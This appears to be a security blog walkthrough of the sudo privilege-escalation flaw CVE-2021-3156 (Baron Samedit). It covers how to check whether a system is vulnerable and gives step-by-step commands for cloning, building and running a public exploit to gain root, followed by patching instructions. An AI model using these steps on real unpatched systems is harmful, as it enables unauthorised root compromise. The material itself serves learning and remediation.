---

title: CVE-2021-3156 | Baron Samedit
date: 2021-02-12 16:00:00 +5:30
description: This is a PoC of the recent sudo vulnerability released by Qualys
image: /images/cover.jpg
categories: [CTFs & Walkthroughs, CVEs]
tags: [sudo, cve, 2021, baron samedit, qualys] # add tag

---

# CVE-2021-3156 | Baron Samedit
---
On January 26, 2021,  Qualys released a [blog post](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  detailing a new vulnerability in the Unix `sudo` program.

Specifically, this was a heap buffer overflow allowing any user to escalate privileges to root -- no misconfigurations required. This exploit works with the default settings, for any user regardless of sudo permissions. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1, meaning that it's been around for the last ten years.  

The program was very quickly patched, so this exploit will no longer work on up-to-date targets; however, it is still incredibly powerful.

# PoC
---
This PoC was obtained from a researcher named [lockedbyte](https://twitter.com/lockedbyte), uploaded to a git repo [here](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156).

## Enumerate
---
First, to test if a system is vulnerable or not, login to the system as a non-root user.

- Run command `sudoedit -s /`

- If the system is vulnerable, it will respond with an error that starts with `sudoedit:`

- If the system is patched, it will respond with an error that starts with `usage:`

However, if you're not in the sudoers file to begin with, then this method will not work.

Alternatively, you can just run the command `sudo --version` and see if the version is in the range with the ones in the blog post. (1.8.2-1.8.31p2 and 1.9.0-1.9.5p1)

![](/images/cve-baron-version.PNG)

## Exploit
---
Next, once you have confirmed the machine is vulnerable, exploitation is very easy.

- Simply clone the git repo with the command, `git clone https://github.com/blasty/CVE-2021-3156.git`
 ![](/images/cve-baron-clone.PNG)
- Now run the `make` command
 ![](/images/cve-baron-make.PNG)
- Run the `./sudo-hax-me-a-sandwich` with no arguments to display the target list.
 ![](/images/cve-baron-dotslash.PNG)
- Match your machine with the correct target.
	- You can do this by running the command `cat /etc/os-release`
	 ![](/images/cve-baron-osver.PNG)
- Finally, just run the command `./sudo-hax-me-a-sandwich <target_number>`
 ![](/images/cve-baron-exploit.PNG)

[Video of exploit](https://youtu.be/XxarHSsOhfE)


And just like that, this machine is fully compromised.

# Remediate
---
At this point, almost all package repos have the updated sudo binary ready for update. For Debian distros, simply:
- sudo apt update
- sudo apt install sudo

Or the manual way:
- wget https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz 
- tar xzvf sudo-1.9.5p2.tar.gz  
- cd sudo-1.9.5p2  
- ./configure  
- make && sudo make install  
- bash -c "sudo --version"
